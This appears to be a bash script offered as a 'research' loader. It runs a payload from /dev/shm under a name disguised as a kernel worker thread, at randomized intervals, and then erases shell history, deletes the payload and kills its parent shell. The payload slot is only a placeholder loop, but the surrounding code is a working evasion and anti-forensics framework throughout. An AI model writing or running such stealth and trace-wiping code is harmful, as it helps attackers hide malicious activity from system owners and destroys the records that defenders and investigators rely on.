#!/bin/bash
#------------------------------------------
# STEALTHY RAM-ONLY LOADER (for research)
#
# - Loads and runs a payload from memory only (never on disk)
# - Renames itself to mimic a kernel thread
# - Executes in randomized active/break intervals within a total window
# - Redirects output to /dev/null
# - Deletes all traces (history, payload, etc.) and kills parent shell
#------------------------------------------

# Safety: Only run on a research VM!

#---------------------------
# 1. Environment hardening
#---------------------------
exec > /dev/null 2>&1      # Silence all output
unset HISTFILE; export HISTFILE=/dev/null
export HISTSIZE=0
history -c 2>/dev/null

#---------------------------
# 2. Build payload in /dev/shm (RAM)
#---------------------------
cat > /dev/shm/.xworker <<'PAYLOAD'
#!/bin/bash
# Example payload: simulates mouse move with X11
for i in {1..3}; do
    sleep 1
    # Replace with real payload logic here
done
PAYLOAD
chmod +x /dev/shm/.xworker

#---------------------------
# 3. Process renaming (disguise as kernel worker)
#---------------------------
PAYLOAD_PATH="/dev/shm/.xworker"
KWORKER_NAME="[kworker/u8:5]"

#---------------------------
# 4. Random interval execution logic
#---------------------------
START=$(date +%s)
# Total time: random between 4320s (1h12m) and 13140s (3h39m)
TOTAL_TIME=$(( ( RANDOM % (13140-4320+1) ) + 4320 ))
END=$((START + TOTAL_TIME))

while [ $(date +%s) -lt $END ]; do
    # Run for random duration: 122s (2m2s) to 573s (9m33s)
    RUN_FOR=$(( ( RANDOM % (573-122+1) ) + 122 ))
    # Break for random duration: 17s to 193s (3m13s)
    SLEEP_FOR=$(( ( RANDOM % (193-17+1) ) + 17 ))

    # Launch payload with process rename (runs in foreground, output silenced)
    exec -a "$KWORKER_NAME" "$PAYLOAD_PATH" &

    PAYLOAD_PID=$!
    sleep $RUN_FOR
    kill -9 $PAYLOAD_PID 2>/dev/null

    # Remove any traces of the payload process
    wait $PAYLOAD_PID 2>/dev/null
    sleep $SLEEP_FOR
done

#---------------------------
# 5. Cleanup: wipe files and shell
#---------------------------
rm -f "$PAYLOAD_PATH"
history -c 2>/dev/null
cat /dev/null > ~/.zsh_history 2>/dev/null
cd /
# Optional: unmount private volume
# private-off 2>/dev/null

# Kill parent shell (leaves no process behind)
kill -9 $PPID
exit 0
